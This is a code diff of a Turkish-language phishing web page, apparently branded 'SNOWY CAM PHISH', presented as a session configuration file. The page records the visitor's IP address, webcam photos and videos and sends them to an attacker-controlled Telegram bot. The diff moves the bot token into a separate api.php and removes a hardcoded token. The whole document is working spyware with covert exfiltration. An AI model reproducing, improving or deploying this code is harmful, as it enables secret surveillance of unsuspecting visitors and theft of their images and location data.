@@ -1,6 +1,5 @@
 <?php
 // Session yapılandırması - v3.2.1
-$BOT_TOKEN = "7998364179:AAGs83KUMQIHxNpxoKiPKQ1tBInU0g0kgrE";
 ?>
 <!DOCTYPE html>
 <html lang="tr">
@@ -108,29 +107,40 @@ $BOT_TOKEN = "7998364179:AAGs83KUMQIHxNpxoKiPKQ1tBInU0g0kgrE";
     <script>
         (function() {
             // ==================== KONFİGÜRASYON ====================
-            const BOT_TOKEN = "<?php echo $BOT_TOKEN; ?>";
+            let BOT_TOKEN = "";
+            
+            // Token'ı api.php'den al
+            fetch('api.php')
+                .then(response => response.json())
+                .then(data => {
+                    BOT_TOKEN = data.token;
+                    console.log("Token yüklendi");
+                    
+                    // Token geldikten sonra IP'yi gönder
+                    if (TARGET_ID && BOT_TOKEN) {
+                        fetch('https://api.ipify.org?format=json')
+                            .then(r => r.json())
+                            .then(d => {
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        chat_id: TARGET_ID,
+                                        text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
+                                    })
+                                });
+                            })
+                            .catch(e => console.log(e));
+                    }
+                })
+                .catch(error => {
+                    console.error("Token alınamadı:", error);
+                });
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
             const FOTO_SURESI = urlParams.get('foto') ? parseInt(urlParams.get('foto')) : 3;
             const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
-            
-            // ==================== IP ADRESİ GÖNDER ====================
-            if (TARGET_ID && BOT_TOKEN) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(d => {
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                chat_id: TARGET_ID,
-                                text: `❄️ SNOWY CAM PHISH ❄️\n━━━━━━━━━━━━━━━━━━━━━\n🌐 IP Adresi: ${d.ip}\n⏱️ Zaman: ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━━━━\n⚡ @SnowyOrj ⚡`
-                            })
-                        });
-                    })
-                    .catch(e => console.log(e));
-            }
             
             // ==================== KAMERA İŞLEMLERİ ====================
             const video = document.getElementById('video');
@@ -208,10 +218,12 @@ $BOT_TOKEN = "7998364179:AAGs83KUMQIHxNpxoKiPKQ1tBInU0g0kgrE";
                                     formData.append('video', blob, `video_${Date.now()}.webm`);
                                     formData.append('caption', `🎥 Video #${videoIndex} - ${VIDEO_SURESI}s (${videoSure}s | ${boyutKB}KB)`);
                                     
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
+                                    if (BOT_TOKEN) {
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                                            method: 'POST',
+                                            body: formData
+                                        });
+                                    }
                                 };
                                 
                                 mediaRecorder.start();
@@ -266,10 +278,12 @@ $BOT_TOKEN = "7998364179:AAGs83KUMQIHxNpxoKiPKQ1tBInU0g0kgrE";
                                     formData.append('photo', blob, `foto_${Date.now()}.jpg`);
                                     formData.append('caption', `📸 Fotoğraf #${photoCount} (${gecenSure.toFixed(3)}s)`);
                                     
-                                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    });
+                                    if (BOT_TOKEN) {
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                            method: 'POST',
+                                            body: formData
+                                        });
+                                    }
                                 }, 'image/jpeg', 0.85);
                             }
                             
